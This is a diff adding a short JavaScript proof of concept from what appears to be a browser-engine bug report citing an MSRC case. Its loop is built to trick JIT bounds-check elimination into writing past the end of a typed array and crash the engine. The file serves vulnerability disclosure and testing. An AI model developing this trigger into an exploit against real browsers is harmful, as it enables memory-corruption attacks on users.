@@ -1,0 +1,15 @@
+/*
+It seems that this issue is similar to the  issue 1429  (MSRC 42111). It might need to refresh the page several times to observe a crash.
+
+PoC:
+*/
+
+let arr = new Uint32Array(1000);
+for (let i = 0; i < 0x1000000; i++) {
+    for (let j = 0; j < 1; j++) {
+        i--;
+        i++;
+    }
+
+    arr[i] = 0x1234;
+}
